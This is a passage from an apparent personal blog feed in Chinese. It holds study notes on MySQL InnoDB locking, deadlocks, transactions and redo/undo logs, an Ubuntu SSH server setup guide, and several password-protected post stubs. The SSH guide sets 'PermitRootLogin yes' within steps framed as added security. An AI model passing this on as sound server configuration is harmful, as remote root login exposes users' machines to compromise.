而不使用update是因为首先需要检测用户的余额信息，在看是否能进行修改操作。</p><h3 id="6-6-阻塞"><a href="#6-6-阻塞" class="headerlink" title="6.6 阻塞"></a>6.6 阻塞</h3><p><strong>阻塞</strong>由于不同锁之间的兼容性关系，有些时刻一个事务中的锁需要等待另一个事务中的锁释放它所占用的资源。</p><p>Innodb中参数<strong>innodb_lock_wait_timeout</strong>用来控制等待的时间（默认50秒）</p><p><strong>innodb_rollback_on_timeout</strong>用来设定是否在等待超时时对进行中的事务进行回滚操作（默认时OFF）</p><p><strong>innodb_lock_wait_timeout</strong>是动态的，通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @@innodb_lock_wait_timeout&#x3D;60</span><br></pre></td></tr></table></figure><p><strong>innodb_rollback_on_timeout</strong>是静态的，不可再启动时进行修改。</p><p>当发生超时时，Mysql数据库会抛出一个1205的错误。</p><h3 id="6-7-死锁"><a href="#6-7-死锁" class="headerlink" title="6.7 死锁"></a>6.7 死锁</h3><p><strong>死锁时指两个或两个以上的事务再执行过程中，因争夺锁资源而造成的一种互相等待的现象。</strong>若无外力作用，事务将无法推进下去。</p><p>解决死锁的方式：</p><ol><li>不要有等待，所有的等待都转换为回滚，并且事务重新开始。但是会导致并发性能的下降，甚至任何一个事务都不能进行。</li><li>当两个事务互相等待时，当一个等接待时间超过设置的某一个阈值时，其中一个进行回滚，另一个等待的事务就能继续运行。InnoDB存储引擎中，参数innodb_lock_wait_timeout用来设置超时的时间。</li><li>除了超时机制，当前数据普遍采用wait-for graph（等待图）的方式进行死锁检测。</li></ol><p>wait-for graph要求数据库保存以下两种信息：</p><ol><li>锁的信息链表</li><li>事务等待链表</li></ol><p>通过上述列表构造出一张图，在这个图中若存在回路，就代表存在死锁，因此资源间相互发生等待。</p><p><strong>wait-for graph 是一种较为主动的死锁检测机制</strong>。每个事务请求锁并发生等待都会判断是否存在回路。若存在有死锁，通常来说InnoDB存储引擎选择回滚undo量最小的事务。</p><h4 id="6-7-2-死锁的概率"><a href="#6-7-2-死锁的概率" class="headerlink" title="6.7.2 死锁的概率"></a>6.7.2 死锁的概率</h4><p>死锁的概率与以下因素有关：</p><ol><li>系统中事务的数量，数量越多发生死锁的概率越大。</li><li>每个事务操作的数量越多，发生死锁的概率越大</li><li>操作数据的集合越小发生死锁的概率越大</li></ol><p>一个事务发生死锁的概率为</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118184321.png"></p><p>Innodb存储引擎并不会回滚大部分的错误异常，但是死锁除外。Innodb发现死锁后，Innodb存储引擎会马上回滚一个事务。程序中捕获1213并不需要回滚。</p><h3 id="6-8-锁升级"><a href="#6-8-锁升级" class="headerlink" title="6.8 锁升级"></a>6.8 锁升级</h3><p><strong>锁升级</strong>是指将当前锁的粒度降低。</p><p>Innodb不是根据每个记录来产生行锁的。相反，其根据每个事务访问的每个页对锁进行管理，采用的是位图的方式。</p><h2 id="7-事务"><a href="#7-事务" class="headerlink" title="7.事务"></a>7.事务</h2><p>事务会把数据库从一种一致的状态转换为另一种一致状态。要么所有修改都已经保存了，要么所有修改都不保存。</p><p><strong>事务是访问并更新数据库中各种数据库项的一个程序执行单元。</strong></p><p>Atomicity(原子性)指数据库事务是不可分割的工作单位。只有事务中所有的数据库操作都执行成功，才算成功。</p><p>Consistency(一致性)指数据库从一种状态转变为下一种一致的状态。</p><p>isolation（隔离性）指每个读写事务对其他事务的操作对象能相互分离，即提交前对其他事务都不见，通常使用锁来实现。</p><p>durability（持久性）指事务一旦提交，其结果就是永久性的。即使发生宕机等故障，数据库也能教数据库恢复。</p><h4 id="7-1-2-分类"><a href="#7-1-2-分类" class="headerlink" title="7.1.2 分类"></a>7.1.2 分类</h4><p>事务的分类：</p><ol><li>扁平事务</li><li>带有保存点的扁平事务</li><li>链事务</li><li>嵌套事务</li><li>分布式事务</li></ol><p><strong>扁平事务</strong>：在实际生产环境中，最频繁的事务。</p><p>限制：<strong>不能提交或者回滚事务的某一部分，或者分几个步骤提交。</strong>回滚所有操作，代价太大，因为可能前面大多数操作是正确的，就最后操作有问题。</p><hr><p>因此，就出现了<strong>带保存点的扁平事务</strong>。可以有计划的回滚操作，不需要终止整个事务。</p><p><strong>保存点</strong>用来通知系统应该记住事务当前的状态，以便当之后发生错误时，事务能够回到保存点当时的状态。</p><p><strong>保存点用SAVE WORK来创建</strong>，通知系统记录当前的处理状态。当出现问题时，保存点能用作内部的重启动点。<strong>根据引用逻辑，决定回到哪个保存点。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211121182917.png"></p><hr><p><strong>链事务</strong>是保存点模式的一种变种。带有保存点的扁平事务，当发生系统崩溃时，所有的保存点都将消失，因为保存点是易失的(volatile)。</p><p><strong>链事务的思想是提交事务时，释放不需要的数据对象，将必要的处理上下文隐式地传给写一个要开始的事务。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211121183528.png"></p><hr><p><strong>嵌套事务</strong></p><hr><p><strong>分布事务</strong>通常在一个分布式环境下运行的扁平事务，根据数据所在位置访问网络中的不同节点。</p><h3 id="7-2-事务的实现"><a href="#7-2-事务的实现" class="headerlink" title="7.2 事务的实现"></a>7.2 事务的实现</h3><p>原子性、一致性、持久性通过数据库的redo log和Undo log来完成。</p><p><strong>redo log称为重做日志，保证事务的原子性和持久性。redo恢复提交事务修改的页操作。redo通常是物理日志，记录的是页的物理修改操作。</strong></p><p><strong>undo log用来办证事务的统一性。回滚到行记录到某个特定版本。undo是逻辑日志，根据每行记录进行记录。</strong>帮助事务回滚及MVCC功能。</p><h4 id="7-2-2-redo"><a href="#7-2-2-redo" class="headerlink" title="7.2.2 redo"></a>7.2.2 redo</h4><p>重做日志实现事务的持久性。包含两个部分：</p><ol><li>内存中的重做日志缓冲，易失的。</li><li>重做日志文件，持久的。</li></ol><p>Innodb是事务的存储引擎，通过Force log  at commit机制实现事务持久性，<strong>每当事务提交时，都会先将事务的所有日志写入到重做日志文件中。</strong></p><p>redo log顺序读写，数据库运行时不需要对redo log的文件进行读取操作。</p><p>undo log 进行随机读写。</p><p>为了确保重做日志写入磁盘，必须进行一次fsync操作。</p><p>参数innodb_flush_log_at_trx_commit用来控制重做日志刷新到磁盘的策略。</p><ul><li>默认值为1，表示事务提交时必须调用一次fsync操作</li><li>0表示提交时不进行写入重做日志操作，仅在Master thread中完成，在master thread中每1秒会进行一次重做日志文件fsync操作</li><li>2表示事务提交时讲重做日志写入重做日志文件，但是仅仅写入文件系统的缓存中，不进行fsync操作。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211122145810.png"></p><p>mysql数据库中还有一种二进制日志(binglog)。用来进行POINT-IN-TIME（PIT）的恢复及主从复制环境的建立。</p><p><strong>二进制日志和重做日志的区别</strong>：</p><ol><li>重做日志是在Innodb存储引擎上产生，二进制日志是在mysql数据库的上层产生，二进制日志不仅仅针对于Innodb存储引擎，mysql数据库中的任何存储引擎对于数据库的更改都会产生二进制日志。</li><li><strong>二进制日志是一种逻辑日志，记录的是对应的sql语句。Innodb存储引擎层面的重做日志是物理格式日志，记录的是对于每个页的修改。</strong></li><li>二者记录的时间也不同，二进制日志在事务提交完成后进行一次写入，Innodb存储引擎的重做日志在事务进行中不断地被写入。</li></ol><p><strong>2.log block</strong></p><p>InnoDB存储引擎中，重做日志以512字节进行存储。意味着重做日志缓存、重做日志文件都是以块的方式进行保存的，称为重做日志块，每块的大小为512字节。</p><p><strong>3.log group</strong></p><p>重做日志组，其中有多个重做日志文件。</p><p>4.<strong>重做日志格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211122153945.png"></p><p>redo_log_type:重做日志的类型</p><p>space:表空间的ID</p><p>page_no:页的偏移量</p><p><strong>5.LSN</strong></p><p>log sequence number  日志序列号。LSN占用8字节，单挑递增。表示的含义有：</p><ol><li>重做日志写入的总量，单位字节</li><li>checkpoint的位置</li><li>页的版本</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211122154412.png"></p><p><strong>6.恢复</strong></p><p>Innodb’在启动时，不管上次数据库运行是否正常关闭，都会尝试进行恢复操作。重做日志记录的是物理日志，因此恢复的速度要比逻辑日志块，如二进制日志。</p><p>由于checkpoint表示已经刷新到磁盘上页的LSN，因此在恢复过程中仅需恢复checkpoint开始的日志部分。</p><h4 id="7-2-2-undo"><a href="#7-2-2-undo" class="headerlink" title="7.2.2 undo"></a>7.2.2 undo</h4><p>undo 进行事务的回滚操作。undo存放在数据库内部的一个特殊段中，该段为undo段。undo位于共享表空间内。</p><p>undo是逻辑日志，因此只是将数据库逻辑恢复到原来的样子。并不是将一个页回滚到事务开始的样子。</p><p>回滚就是执行相反的操作：Insert就是Delete，update对应相反的update</p><p>undo的另一个作用就是<strong>MVCC</strong>,<strong>即在Innodb存储引擎中MVCC的实现是通过undo来完成。</strong></p><p><strong>通过undo读取之前的版本信息来实现非锁定读取</strong></p><p><strong>undo log也会产生 redo  log，也就是Undo log的产生会伴随着redo log的产生，因为undo log也需要持久性的保护。</strong></p><p><strong>2.undo 存储管理</strong></p><p>Innodb存储对Undo的管理同样采用<strong>段</strong>的方式。和之前介绍的段不同。</p><p>可以通过以下参数对rollback segment做进一步的设置。</p><p>包括：</p><ol><li><p>innodb_undo_directory</p><p>设置rollback segment文件所在的路径，即rollback segement可以存放在共享表空间以外的位置。</p></li><li><p>innodb_undo_logs</p><p>设置rollback segement的个数，默认值为128</p></li><li><p>innodb_undo_tablespaces</p><p>设置rollback segement文件的数量。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看innodb_undo参数</span><br><span class="line">show variables like &quot;innodb_undo%&quot;;</span><br></pre></td></tr></table></figure><p>事务提交时，Innodb存储引擎会做以下两件事情：</p><ol><li>将Undo log放入列表中，以供之后的purge操作</li><li>判断undo log所在的页是否可以重用，若可以分配给下个事务使用。</li></ol><p>事务提交后并不能马上删除Undo log及undo log所在的页。其他事务需要Undo log来得到行记录之前的版本。</p><p><strong>事务提交之后将Undo log放入一个链表中,是否可以删除Undo log以及undo log所在的页由purge线程来判断。</strong></p><p><strong>Innodb中对undo页重用</strong>：</p><ol><li>事务提交后，首先将Undo log放入链表中</li><li>判断undo页的使用空间是否小于3/4</li><li>若是则被重用，之后新的undo log记录在当前undo log的后面。</li></ol><p><strong>3.undo log格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123152901.png"></p><p><strong>Innodb中  undo log分为</strong>：</p><ol><li>INSERT UNDO LOG</li><li>UPDATE UNDO LOG</li></ol><p><strong>1.  insert undo log</strong></p><p><strong>由insert操作产生的undo log</strong>。因为对Insert 操作的记录，只对事务本身可见，对其他事务不可见（事务隔离性的要求）。<strong>故undo Log可以在事务提交后直接删除。不需要进行purge操作。</strong></p><p><strong>2.update undo log</strong></p><p>记录的是对delete 和 update操作产生的undo log。<strong>该undo log可能需要提供MVCC机制，因此不能在事务提交时就进行删除。</strong></p><p>提交时放入Undo log链表。等待purge线程进行最后的删除。</p><h4 id="7-2-3-purge"><a href="#7-2-3-purge" class="headerlink" title="7.2.3 purge"></a>7.2.3 purge</h4><p>delete 和update操作可能并不直接删除原有的数据。</p><p>delete仅仅是将主键列等于1的记录delete flag设置为1，记录并没有被删除，记录还是存在于B+树的。<strong>真正删除这行记录的操作其实被延时了，最终在purge操作中完成。</strong></p><p><strong>purge用于最终完成delete 和 update操作。这样设计是为了Innodb存储引擎支持MVCC，所以记录不能再事务提交时立即进行处理。</strong>其他事务可能正在引用这行，Innodb存储引擎需要保存记录之前的版本，若该行不被任何其他事务引用，那么就可以进行正真的delete操作。</p><p>purge的执行过程：</p><ol><li>从history list中找到第一个需要被清理的记录</li><li>清理之后Innodb存储会在事务的undo log所在的页中继续寻找存在可以被清理的记录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123154419.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123154806.png"></p><h4 id="7-2-4-Group-commit"><a href="#7-2-4-Group-commit" class="headerlink" title="7.2.4 Group commit"></a>7.2.4 Group commit</h4><h3 id="7-3-事务控制语句"><a href="#7-3-事务控制语句" class="headerlink" title="7.3 事务控制语句"></a>7.3 事务控制语句</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>start transaction   |   begin</td><td>显示地开启一个事务</td></tr><tr><td>commit</td><td>提交事务</td></tr><tr><td>rollback</td><td>回滚事务</td></tr><tr><td>savepoint identifier</td><td>允许在事务中创建一个保存点，一个事务可以有多个保存点</td></tr><tr><td>release savepoint identifier</td><td>删除一个事务的保存点</td></tr><tr><td>rollback to identifier</td><td>回滚到目标标记点</td></tr><tr><td>set transaction</td><td>设置事务的隔离级别</td></tr></tbody></table><p>在存储过程中，只能使用start transaction语句来开启一个事务。</p><p>当<strong>completion_type</strong>参数为默认值0时，commit 和commit work是完全等价的。</p><p>当其为1时，commit word 等价于 <strong>commit and chain</strong>,表示马上自动开启一个相同隔离级别的事务。也就是事务变成了链事务。</p><p>当其为2时，等同于<strong>commit and release</strong>，在事务提交后会自动断开与服务器的连接。</p><p><strong>rollack to savepoiont命令并不真正地结束事务</strong>，也需要显示地允许commit或rollback命令。</p><h3 id="7-4-隐式提交的SQL语句"><a href="#7-4-隐式提交的SQL语句" class="headerlink" title="7.4 隐式提交的SQL语句"></a>7.4 隐式提交的SQL语句</h3><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123163016.png"></p><h3 id="7-5-对事务操作的统计"><a href="#7-5-对事务操作的统计" class="headerlink" title="7.5 对事务操作的统计"></a>7.5 对事务操作的统计</h3><h3 id="7-6-事务的隔离级别"><a href="#7-6-事务的隔离级别" class="headerlink" title="7.6 事务的隔离级别"></a>7.6 事务的隔离级别</h3><p><strong>1.Read Uncommitted</strong></p><p><strong>2.Read Committed</strong></p><p><strong>3.Repeatable Read</strong></p><p><strong>4.Serializable</strong></p><p>隔离级别越低，事务请求的锁越少或保持锁的时间就越短。这也是大多数数据库默认的事务隔离级别是Read Committed。</p><p>在Seriablable的事务隔离级别下，Innodb存储引擎会对每个select语句后自动加上loke in share mode，即为每个读取操作加一个共享锁。</p><p><strong>一般不在本地事务中使用seriablable的隔离级别，seriablable的事务隔离级别主要用于Innodb存储引擎的分布式事务。</strong></p><h3 id="7-7-分布式事务"><a href="#7-7-分布式事务" class="headerlink" title="7.7 分布式事务"></a>7.7 分布式事务</h3><h3 id="7-8-不好的事务习惯"><a href="#7-8-不好的事务习惯" class="headerlink" title="7.8 不好的事务习惯"></a>7.8 不好的事务习惯</h3><h4 id="7-8-1-在循环中提交"><a href="#7-8-1-在循环中提交" class="headerlink" title="7.8.1 在循环中提交"></a>7.8.1 在循环中提交</h4><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123210717.png"></p><p>会进行多次重做日志文件，增加消耗。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123210738.png"></p><p>只进行一次重做日志文件的写入。</p><p><strong>不应该在循环中反复进行提交操作，不论是显式地提交还是隐式地提交。</strong></p><h4 id="7-8-2-使用自动提交"><a href="#7-8-2-使用自动提交" class="headerlink" title="7.8.2  使用自动提交"></a>7.8.2  使用自动提交</h4><p>自动提交不是一个好习惯。</p><p>mysql数据库默认设置使用自动提交。</p><p>start transaction,begin显式地开启一个事务时，会默认执行set autocommit=0的命令。</p><h4 id="7-8-3-使用自动回滚"><a href="#7-8-3-使用自动回滚" class="headerlink" title="7.8.3 使用自动回滚"></a>7.8.3 使用自动回滚</h4><p>Innodb存储引擎支持通过定义一个Handler来进行自动事务的回滚操作。如在一个存储过程中发生了错误会自动对其进行回滚操作。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211123211509.png"></p><p>数据库开发人员应该自己正确的回滚事务，从而直到问题错在哪里。而不是交给系统。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>show命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对表中的每一个字段返回一行 包含每个字段的信息</span><br><span class="line">show columns from  table</span><br><span class="line">&#x2F;&#x2F;mysql  使用describe 作为show columns的快捷方式</span><br><span class="line">describe table 来代替 show columns from table</span><br><span class="line">&#x2F;&#x2F;显示服务器状态信息</span><br><span class="line">show status </span><br><span class="line">&#x2F;&#x2F;显示创建特定数据库或表的Mysql语句</span><br><span class="line">show create table  和   show create database</span><br><span class="line">&#x2F;&#x2F;显示授予用户的安全权限</span><br><span class="line">show grants</span><br><span class="line">&#x2F;&#x2F;显示服务器错误或者警告信息</span><br><span class="line">show  errors  和 show  warnings;</span><br></pre></td></tr></table></figure><p>select</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;限定行数</span><br><span class="line">limit 5    &#x2F;&#x2F;只要5行</span><br><span class="line">limit  5,5   &#x2F;&#x2F;从第5行开始的5行</span><br></pre></td></tr></table></figure><p>And操作符在计算次序中优先级更高，解决方法是使用圆括号明确的分组相应的操作符    </p><p>Regexp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; . 是正则表达式语言中表示匹配任意一个字符</span><br><span class="line"></span><br><span class="line">select pname</span><br><span class="line">from products</span><br><span class="line">where pname regexp &#39;.000&#39;</span><br><span class="line">order by pnmae;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; |为正则表达式的OR操作</span><br><span class="line">where pname regexp &#39;1000|2000&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; []为OR的另外一种形式</span><br><span class="line">where panme regexp &#39;[123] tom&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; -  [0-9] 代替了[12346789]  [a-z]匹配任意字母</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;    \\表示的是转义  \\-  \\. 表示查找对用的字符</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211030154912.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211030155050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211030160113.png"></p><blockquote><p>mysql使用concat函数来拼接两个列</p><p>rtrim可以删除数据右侧多余的空格</p><p>Upper函数将文本转为大写</p><p>left 返回串左边的字符</p><p>length  返回串的长度</p><p>locate   找出串的子串</p><p>right    返回串右边的字符</p><p>soundex()    返回串的sound值   发音匹配</p><p>SubString     返回字串的字符</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211030162403.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mysql技术&quot;&gt;&lt;a href=&quot;#Mysql技术&quot; class=&quot;headerlink&quot; title=&quot;Mysql技术&quot;&gt;&lt;/a&gt;Mysql技术&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;声明：该文章为我学习Mysql技术引擎Innodb的笔记，欢迎查阅&lt;/p&gt;</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="mysql技术" scheme="https://a2914475618.github.io/tags/mysql%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>java面经</title>
    <link href="https://a2914475618.github.io/2021/10/09/java%E9%9D%A2%E7%BB%8F/"/>
    <id>https://a2914475618.github.io/2021/10/09/java%E9%9D%A2%E7%BB%8F/</id>
    <published>2021-10-09T01:30:53.000Z</published>
    <updated>2021-11-05T12:27:28.738Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to real.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term=":面经" scheme="https://a2914475618.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu</title>
    <link href="https://a2914475618.github.io/2021/10/08/ubuntu/"/>
    <id>https://a2914475618.github.io/2021/10/08/ubuntu/</id>
    <published>2021-10-08T08:26:20.000Z</published>
    <updated>2021-10-08T08:47:05.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h1><blockquote><p>作为我用ubuntu踩坑的记录，大多是为了我以后容易查阅</p></blockquote><h2 id="ssh远程连接ubuntu"><a href="#ssh远程连接ubuntu" class="headerlink" title="ssh远程连接ubuntu"></a>ssh远程连接ubuntu</h2><blockquote><p>原文：<a href="https://blog.csdn.net/y22y22y/article/details/120339331">https://blog.csdn.net/y22y22y/article/details/120339331</a></p></blockquote><p>1.首先在Ubuntu上安装openssh-server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br></pre></td></tr></table></figure><p>安装好以后，ssh server应该已经开始运行了，可以用下面的命令检查ssh server的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status sshd</span><br></pre></td></tr></table></figure><p>另外，需要的时候，还可以利用systemctl命令打开(start)/关闭(stop)/重启(restart)ssh server，例如下面的命令就可以用来重启ssh server服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart ssh</span><br></pre></td></tr></table></figure><p>2.利用Ubuntu自带的ufw 修改防火墙状态</p><p>首先开启防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p>打开传输ssh的端口（默认22） </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure><p>设置ssh server开机启动 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p>3.现在就可以用 ssh username@IP远程连接电脑了</p><p>查询IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p>所以ssh连接这台电脑的命令为⬇️</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh linuxconfig@192.168.1.112</span><br></pre></td></tr></table></figure><p>4.到上一步为止，其实已经可以实现连接功能了，但是为了安全着想，最好将ssh的端口从默认的22改为另一个大于1024的数字</p><p>编辑ssh server配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><pre><code>Port 2222   #设置ssh的端口号PermitRootLogin yes   # 可以root远程登录</code></pre><p>打开设定的ssh端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 2222&#x2F;tcp</span><br></pre></td></tr></table></figure><p> 重启ssh server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart ssh</span><br></pre></td></tr></table></figure><p>现在，可以连接你的电脑了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 linuxconfig@192.168.1.112</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ubuntu&quot;&gt;&lt;a href=&quot;#Ubuntu&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu&quot;&gt;&lt;/a&gt;Ubuntu&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;作为我用ubuntu踩坑的记录，大多是为了我以后容易查阅&lt;/p&gt;
&lt;/blockq</summary>
      
    
    
    
    <category term="操作系统" scheme="https://a2914475618.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ubuntu" scheme="https://a2914475618.github.io/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="https://a2914475618.github.io/2021/10/05/Docker/"/>
    <id>https://a2914475618.github.io/2021/10/05/Docker/</id>
    <published>2021-10-05T09:03:06.000Z</published>
    <updated>2021-10-08T07:33:40.076Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="docker" scheme="https://a2914475618.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>spring boot</title>
    <link href="https://a2914475618.github.io/2021/10/05/spring-boot/"/>
    <id>https://a2914475618.github.io/2021/10/05/spring-boot/</id>
    <published>2021-10-05T05:23:46.000Z</published>
    <updated>2021-10-08T07:32:57.680Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="spring boot" scheme="https://a2914475618.github.io/tags/spring-boot/"/>
    
  </entry>
  
  <entry>
    <title>shiro</title>
    <link href="https://a2914475618.github.io/2021/10/01/shiro/"/>
    <id>https://a2914475618.github.io/2021/10/01/shiro/</id>
    <published>2021-10-01T01:44:24.000Z</published>
    <updated>2021-10-08T07:33:10.098Z</updated>
    
